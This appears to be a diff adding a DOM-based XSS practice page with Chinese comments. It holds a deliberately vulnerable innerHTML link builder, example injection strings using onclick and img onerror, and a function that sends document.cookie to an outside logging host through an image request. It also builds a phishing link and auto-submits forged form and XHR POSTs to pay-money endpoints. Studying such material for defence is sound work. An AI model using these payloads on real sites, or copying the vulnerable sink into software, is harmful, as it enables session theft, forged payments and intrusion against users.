@@ -1,0 +1,92 @@
+<!-- 点击write时,test()函数修改了DOM节点,通过innerHtml写到页面中,这就构成了 DOM Based XSS -->
+
+<!-- 构造输入数据 => ' onclick=alert(/xss/) // -->
+<!-- 通过字符串拼接和转义形成了一个点击事件 -->
+
+<!-- 构造输入数据 => '><img src=# onerror=alert(/xss/) /><' -->
+<!-- 通过字符串拼接闭合,形成一个新的DOM标签  -->
+<script type="text/javascript">
+	
+	//点击事件
+	function test() {
+		var str = document.getElementById('text').value ;
+		document.getElementById('t').innerHTML = "<a href='"+str+"'>testLink</a>" ;
+	}
+
+	//测试凭证获取
+	function payload() {
+		//获取登录凭证,逐个删除cookie的值,筛选出登录凭证,拿到登录凭证后,可以换个浏览器测试登录
+		document.cookie ; //获取当前页面的cookie,无法完全获取application里面的所有值
+		document.cookie = 'key=name'; //新增或者设置某个值
+		var img = document.createElement('img');
+		img.src = 'https://test-trade.qaqgame.com/log?'+escape(document.cookie);
+		document.body.appendChild(img);
+	}
+	
+	//构建恶意钓鱼地址
+	function payload2() {
+		var img = document.createElement('a');
+		//恶意代码地址
+		img.href = 'http://base.com/Self/SomeSafety/WhiteHat/A-3.php';
+		img.innerText = '点我跳转';
+		document.body.appendChild(img);
+	}
+
+    /*表单构建*/
+	function buildForm() {
+	    var f = document.createElement("form");
+	    document.body.appendChild(f);
+	    var hidField = {
+	        'par_value' : '23' ,
+	        'money' : '23' ,
+	        'type' : '3223'
+	    } ;
+	    for( var i in hidField ) {
+	        var temp = document.createElement("input");
+	        temp.type = "hidden";
+	        f.appendChild(temp);
+	        temp.value = hidField[i];
+	        temp.name = i ;
+	    }
+	    /*JSON.stringify()
+	    JSON.parse()*/
+	    f.action = "/user/account/pay-money";
+	    f.method = "post";
+	    f.submit();
+	}
+
+	/*表单构建2*/
+	function buildForm2(argument) {
+	    /*原生header设置*/
+	    var xmlhttp = new XMLHttpRequest();
+	    //POST发送
+	    xmlhttp.open("POST", "/bar/steam-code/pay-money",true);
+	    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	    //xmlhttp.setRequestHeader("token","header-token-value"); // 可以定义请求头带给后端
+	    var content = "appid=11111&sign=222222222"; //application/x-www-form-urlencoded
+	    xmlhttp.send(content) ; //内容格式根据Content-type设置的格式而定
+
+	    //GET发送
+	    xmlhttp.open("GET", "/bar/steam-code/pay-money?id=23",true);
+	    xmlhttp.send();
+
+	    xmlhttp.onreadystatechange = function(){
+	        if(xmlhttp.readyState == 4 && xmlhttp.status == 200){
+	            //成功
+	            console.log(xmlhttp.responseText);
+	        }
+	    }
+	}   
+
+	//构建dom表单提交
+	function buildForm3(argument) {
+		var div = document.createElement('div');
+		document.body.appendChild(div);
+		div.innerHTML = '<form action="" method="post" id="form3"> <input type="text" value="text" name="text" /> </form>' ;
+		document.getElementById('form3').submit();
+	}
+
+</script>
+<div id="t"></div>
+<input type="text" id="text" value="">
+<input type="button" id="s" value="write" onclick="test()">
